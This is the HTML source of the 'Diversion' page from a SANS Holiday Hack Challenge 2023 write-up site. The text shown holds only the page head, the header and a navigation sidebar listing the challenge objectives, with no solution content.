
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Shahne Rodgers">
      
      
      
        <link rel="prev" href="o21.html">
      
      
        <link rel="next" href="../easter_eggs.html">
      
      
      <link rel="icon" href="../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Diversion - SANS Holiday Hack Challenge 2023 Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../css/extra.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="green">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#missile-diversion" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../index.html" title="SANS Holiday Hack Challenge 2023 Write-Up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2023 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 15.26V13h-4l4-4h-3l3-3h-2l3-3 3 3h-2l3 3h-3l4 4h-4v2.76c2.13.71 3.68 1.91 4 3.24-1.7-.13-3.38-.46-5-1-1.21.61-2.63 1-4 1-1.29 0-2.83-.42-4-1-1.63.54-3.28.87-5 1 .54-2.23 4.4-4 9-4 1.05 0 2.06.09 3 .26M8 19s-3 1-6 1v2c3 0 6-1 6-1s2 1 4 1 4-1 4-1 3 1 6 1v-2c-3 0-6-1-6-1s-2 1-4 1-4-1-4-1Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS Holiday Hack Challenge 2023 Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Diversion
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../index.html" title="SANS Holiday Hack Challenge 2023 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2023 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 15.26V13h-4l4-4h-3l3-3h-2l3-3 3 3h-2l3 3h-3l4 4h-4v2.76c2.13.71 3.68 1.91 4 3.24-1.7-.13-3.38-.46-5-1-1.21.61-2.63 1-4 1-1.29 0-2.83-.42-4-1-1.63.54-3.28.87-5 1 .54-2.23 4.4-4 9-4 1.05 0 2.06.09 3 .26M8 19s-3 1-6 1v2c3 0 6-1 6-1s2 1 4 1 4-1 4-1 3 1 6 1v-2c-3 0-6-1-6-1s-2 1-4 1-4-1-4-1Z"/></svg>

    </a>
    SANS Holiday Hack Challenge 2023 Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../index.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Objectives
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Objectives
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Christmas Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Christmas Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o2.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Snowball Fight
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o3.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Linux 101
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o4.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Reportinator
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o5.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Azure 101
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Island of Misfit Toys
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Island of Misfit Toys
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o6.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Luggage Lock
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o7.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Linux PrivEsc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o15.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Hashcat
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Steampunk Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Steampunk Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o8.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Faster Lock Combination
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o18.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    The Captain's Comms
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o19.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Active Directory
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Game Cartridges
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Game Cartridges
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o9.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Vol 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o10.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Vol 2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o11.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Vol 3
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Film Noir Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Film Noir Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o12.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Na'an
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o13.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    KQL Kraken Hunt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o14.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Phish Detection Agency
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
        
          
          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pixel Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6">
            <span class="md-nav__icon md-icon"></span>
            Pixel Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o16.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Elf Hunt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o17.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Certificate SSHenanigans
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" checked>
        
          
          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Space Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_7">
            <span class="md-nav__icon md-icon"></span>
            Space Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o20.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Space Island Door Access Speaker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="o21.html" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Camera Access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Diversion
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="o22.html" class="md-nav__link md-nav__link--active">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Diversion
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    <span class="md-ellipsis">
      Objective
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      Hints
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      Solution
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#response" class="md-nav__link">
    <span class="md-ellipsis">
      Response
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#java-code" class="md-nav__link">
    <span class="md-ellipsis">
      Java code
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Extras
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Extras
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../easter_eggs.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Easter Eggs
  </span>
  

      </a>
    </li>
  

              
            
